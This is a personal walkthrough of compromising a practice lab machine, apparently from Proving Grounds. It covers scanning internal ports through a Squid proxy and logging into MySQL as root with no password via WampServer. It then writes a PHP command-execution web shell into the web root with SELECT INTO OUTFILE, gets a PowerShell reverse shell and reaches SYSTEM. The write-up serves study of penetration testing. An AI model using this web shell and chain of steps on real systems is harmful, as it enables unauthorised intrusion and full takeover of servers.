# Main

[Back to Table of Contents](../cysec)


This is an overview of my methods in rooting a machine from pg. I have purposefully left the names of all pg machines out in titles and replaced them with generic names to avoid any spoiling while still maintaining the opportunity to share my methods, skills, and journey. 

## Initial

### Port scans:
```
PORT     STATE SERVICE    REASON
3128/tcp open  squid-http syn-ack

```

After performing initial service enumeration on the target, it was discovered that only one TCP port was open. Navigating to this led to a page for 'squid proxy.'
Researching squid proxy led me to understand that it can act as a proxy between local services and the web. I found a python script made with the purpose of scanning the system via the proxy and discovered two open ports, one of them being a web server. 
I then used foxyproxy in firefox to create an http proxy with the target ip and squid proxy port and was able to access the internal webserver.

---

### Web - initial:

```
PORT     STATE SERVICE    REASON
3128/tcp open  squid-http syn-ack┌──(kali㉿kali)-[/scripts/spose]
└─$ python spose.py --proxy http://192.168.133.189:3128 --target 192.168.133.189     
Using proxy address http://192.168.133.189:3128
192.168.133.189 3306 seems OPEN 
192.168.133.189 8080 seems OPEN 
```

```
foxyproxy:
192.168.133.189 3128 http

http://192.168.133.189:8080/ --> wampserver
```
After navigating to the site, a configuration page was discovered. On this page, the default configuration for mysql was found to be root with no password.

Find location to create a backdoor -- installation directory found by navigating to 'create virtual hosts':
```
Apache Virtual Hosts C:/wamp/bin/apache/apache2.4.46/conf/extra/httpd-vhosts.conf

VirtualHost already defined:

    ServerName : localhost - Directory : C:/wamp/www


```
Add a new database, then create a table and query:
```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\wamp\\www\\backdoor.php"

http://192.168.133.189:8080/backdoor.php?cmd=whoami

nt authority/sytstem

```

Using revshells -- powershell revshell #2, URL -encoded
Other:


```
PS C:\Users\Administrator\Desktop> type proof.txt && whoami && ipconfig
##HASH##
PS C:\Users\Administrator\Desktop> whoami
nt authority\system
PS C:\Users\Administrator\Desktop> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.133.189
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.133.254

```

